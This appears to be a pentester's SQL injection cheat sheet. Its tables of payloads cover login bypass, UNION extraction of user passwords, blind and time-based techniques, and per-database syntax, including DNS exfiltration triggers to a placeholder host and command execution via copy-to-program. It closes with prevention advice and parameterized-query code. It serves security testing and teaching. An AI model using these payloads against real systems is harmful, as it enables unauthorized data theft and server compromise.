---
title: "SQL Injection — Cheat Sheet"
author: marie
date: 2026-07-10T00:00:00-07:00
categories: ["Web Security", "Vulnerabilities"]
tags: [cheat-sheet, sqli, burp-suite]
description: "Condensed, high-density SQL injection reference — detection, injection contexts, UNION and blind techniques, and per-DBMS syntax (Oracle / MSSQL / PostgreSQL / MySQL) in scannable tables."
pin: false
toc: true
comments: true
math: false
mermaid: false
image:
  path: ""
  alt: ""
hidden: false
---

> **What this is** — A reference sheet, not a walkthrough. One scannable page to `Ctrl+F` mid-engagement. Tables carry the load; prose is the minimum needed to use them correctly.
{: .prompt-info }

## What is SQL injection?

SQLi lets an attacker interfere with the queries an application sends to its database — reading data belonging to other users, modifying or deleting data, and sometimes escalating to compromise the server or run denial-of-service. It happens wherever untrusted input is concatenated into a query instead of being passed as a parameter.

**Conventions below:** `--` = comment to end of line · `+` = URL-encoded space · `[T]`/`[C]` = target table/column · payloads shown pre-encoding unless noted · injection assumed inside a single-quoted string in a `WHERE` clause unless stated.

## Detection — first moves

Systematic tests to run against every entry point.

| Probe | Payload | What a positive looks like |
|---|---|---|
| Break the string | `'` | Error, or any behavior/response change ⇒ injectable. |
| Base vs. altered value | math/string that evaluates to original then to something else | Systematic response difference between the two. |
| Boolean logic | `OR 1=1` vs `OR 1=2` | Responses differ between true and false. |
| Time delay | DBMS-specific sleep (see below) | Response is delayed only on the true case. |
| Out-of-band (OAST) | DBMS-specific DNS trigger | Interaction lands in Burp Collaborator. |

> `OR 1=1` can reach an `UPDATE`/`DELETE` if the app reuses request data across queries — risking data loss. Prefer a scoped condition on a live target.
{: .prompt-warning }

## Injection contexts

Most SQLi is in a `SELECT` … `WHERE`, but it arises anywhere input reaches the query.

| Location | Where it hides |
|---|---|
| `SELECT … WHERE` | The classic — quoted string or numeric value. |
| `UPDATE` | Updated values, or the `WHERE` clause. |
| `INSERT` | Inserted values. |
| `SELECT` table/column name | Not parameterizable — needs allow-listing. |
| `ORDER BY` | Not parameterizable — column index/name. |
| Non-URL inputs | JSON/XML bodies, headers, cookies — often used to bypass WAFs via encoding. |

## Core payloads — retrieving data & subverting logic

| Goal | Payload | Resulting query / note |
|---|---|---|
| Reveal hidden rows (drop trailing conditions) | `Gifts'--` | `… WHERE category = 'Gifts'--' AND released = 1` — `AND released = 1` is commented out. |
| Return everything | `Gifts'+OR+1=1--` | `1=1` is always true ⇒ all rows. |
| Login bypass (known user) | `administrator'--` | `… WHERE username = 'administrator'--' AND password = ''` — password check removed. |

## UNION attacks

Append a second `SELECT` and read its results in the response. Requires **(1)** same column count and **(2)** compatible column types.

| Step | Payload | Read the result |
|---|---|---|
| Count columns (ORDER BY) | `'+ORDER+BY+1--`, `2`, `3`… | Increment until "position N out of range" / error. |
| Count columns (UNION NULLs) | `'+UNION+SELECT+NULL--`, `NULL,NULL--`… | Add NULLs until the error stops. `NULL` casts to any type. |
| Find a string-friendly column | `'+UNION+SELECT+'a',NULL,NULL--` (rotate `'a'`) | No cast error + `a` echoed ⇒ that column holds strings. |
| Exfiltrate two known columns | `'+UNION+SELECT+username,password+FROM+users--` | Values appear in the response. |
| Two values, one column | `'+UNION+SELECT+username\|\|'~'\|\|password+FROM+users--` | Concatenation is DBMS-specific (see table). |
| Oracle needs a table | `'+UNION+SELECT+NULL+FROM+dual--` | Every Oracle `SELECT` needs `FROM`; use `dual`. |

## Examining the database

| Goal | Query | Note |
|---|---|---|
| Version | `'+UNION+SELECT+@@version--` (see per-DBMS) | Fingerprint before anything downstream. |
| List tables | `SELECT * FROM information_schema.tables` | Oracle uses `all_tables`. |
| List columns | `SELECT * FROM information_schema.columns WHERE table_name = '[T]'` | Oracle uses `all_tab_columns`. |

## Blind SQLi — pick the oracle you have

No query output and no errors in the response. Extract one character at a time via a boolean oracle.

| Oracle | Payload skeleton | Signal you read |
|---|---|---|
| Conditional response | `xyz'+AND+'1'='1` vs `…'1'='2` | Content differs (e.g. "Welcome back" appears/vanishes). |
| Char extraction | `xyz'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)>'m` | Binary-search each char (`>`, `=`). `SUBSTR` on some DBMS. |
| Conditional error | `xyz'+AND+(SELECT+CASE+WHEN+(cond)+THEN+1/0+ELSE+'a'+END)='a` | DB error appears only when `cond` is true. |
| Verbose error leak | `CAST((SELECT [C] FROM [T]) AS int)` | Error text contains the string value ("invalid input syntax…"). |
| Time delay | DBMS sleep gated on `cond` (see table) | Response is slow only when true. |
| Out-of-band (OAST) | DBMS DNS trigger + subdomain | DNS hit in Collaborator; can exfiltrate data in the subdomain. |

Verbose errors are also a free win: an unterminated-string error often echoes the full query, confirming your exact injection context (quotes, clause, need to comment out the tail).

## Per-DBMS syntax reference

The part worth bookmarking. Source: PortSwigger SQLi cheat sheet.

| Task | Oracle | Microsoft (MSSQL) | PostgreSQL | MySQL |
|---|---|---|---|---|
| String concat | `'foo'\|\|'bar'` | `'foo'+'bar'` | `'foo'\|\|'bar'` | `'foo' 'bar'` (space) or `CONCAT('foo','bar')` |
| Substring (1-based) | `SUBSTR('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` |
| Comment | `--comment` | `--comment` / `/*comment*/` | `--comment` / `/*comment*/` | `#comment` / `-- comment` (needs space) / `/*comment*/` |
| Version | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT version()` | `SELECT @@version` |
| List tables | `SELECT * FROM all_tables` | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.tables` |
| List columns | `SELECT * FROM all_tab_columns WHERE table_name='[T]'` | `… information_schema.columns WHERE table_name='[T]'` | `… information_schema.columns WHERE table_name='[T]'` | `… information_schema.columns WHERE table_name='[T]'` |
| Conditional error | `SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` | `SELECT CASE WHEN (cond) THEN 1/0 ELSE NULL END` | `1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE NULL END)` | `SELECT IF(cond,(SELECT table_name FROM information_schema.tables),'a')` |
| Visible-error leak | — | `SELECT 'foo' WHERE 1=(SELECT 'secret')` | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` | `… AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT 'secret')))` |
| Time delay (10s) | `dbms_pipe.receive_message(('a'),10)` | `WAITFOR DELAY '0:0:10'` | `SELECT pg_sleep(10)` | `SELECT SLEEP(10)` |
| Conditional delay | `SELECT CASE WHEN (cond) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` | `IF (cond) WAITFOR DELAY '0:0:10'` | `SELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END` | `SELECT IF(cond,SLEEP(10),'a')` |
| Batched/stacked | not supported | `Q1; Q2` | `Q1; Q2` | `Q1; Q2` (rarely usable for SQLi) |
| DNS lookup | `SELECT EXTRACTVALUE(xmltype('<?xml … <!ENTITY % remote SYSTEM "http://SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` | `exec master..xp_dirtree '//SUBDOMAIN/a'` | `copy (SELECT '') to program 'nslookup SUBDOMAIN'` | `LOAD_FILE('\\\\SUBDOMAIN\\a')` (Windows only) |

For DNS-with-exfiltration variants (wrapping a subquery inside the subdomain), see the source cheat sheet — same triggers, with `(SELECT YOUR-QUERY)` spliced into the domain.

## Second-order SQLi

Input is stored safely on first request, then later read back and concatenated into a query unsafely — the sink is a *different* request from the source. Developers trust it because "it came from the database." Test stored values (profile names, etc.) that get reused in later queries.

## Prevention

| Situation | Fix |
|---|---|
| Untrusted data as a **value** (`WHERE`, `INSERT`/`UPDATE` values) | Parameterized queries / prepared statements. Never string-concatenate. |
| Untrusted data as **table/column name** or in `ORDER BY` | Can't parameterize — allow-list against known-good values, or redesign the logic. |
| The parameterized string itself | Must be a hard-coded constant; never any variable data. Don't decide "trusted" case-by-case. |

```java
// Vulnerable: input concatenated into the query
String query = "SELECT * FROM products WHERE category = '" + input + "'";

// Safe: input bound as a parameter
PreparedStatement statement =
    connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
```

## References

- PortSwigger SQLi cheat sheet: <https://portswigger.net/web-security/sql-injection/cheat-sheet>
- PortSwigger SQL injection: <https://portswigger.net/web-security/sql-injection>
- CWE-89: <https://cwe.mitre.org/data/definitions/89.html>
